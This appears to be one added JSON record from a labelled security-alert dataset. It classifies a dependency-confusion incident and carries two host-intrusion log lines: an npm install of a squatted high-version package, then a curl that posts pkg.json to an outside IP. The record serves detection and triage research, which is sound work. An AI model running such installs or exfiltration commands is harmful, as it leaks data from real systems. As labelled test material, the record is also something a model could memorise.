@@ -1,0 +1,33 @@
+{
+ "unit": 1137,
+ "gt": {
+  "gt_class": "new",
+  "gt_case": null,
+  "confidence": "high",
+  "needs_review": false,
+  "reason": "不属于已入库的 8 个案例家族"
+ },
+ "technique": "依赖混淆（占用内网包名的高版本公网同名包被自动拉取）",
+ "sources": [
+  "hids",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-07-01 19:44:46",
+   "source": "hids",
+   "log_id": "HID0443507",
+   "content": "npm i ops-corp-telemetry@99.0.0 /usr/bin/npm npm i ops-corp-telemetry@99.0.0 <== node /usr/local/bin/npm",
+   "event_id": "1137-HID0443507"
+  },
+  {
+   "timestamp": "2026-07-01 19:45:28",
+   "source": "hids",
+   "log_id": "HID0443511",
+   "content": "curl -d @pkg.json 203.0.113.44 /usr/bin/curl curl -d @pkg.json 203.0.113.44 <== node /usr/local/bin/npm",
+   "event_id": "1137-HID0443511"
+  }
+ ],
+ "retrieval_full": [],
+ "evidence_for_agent": null
+}
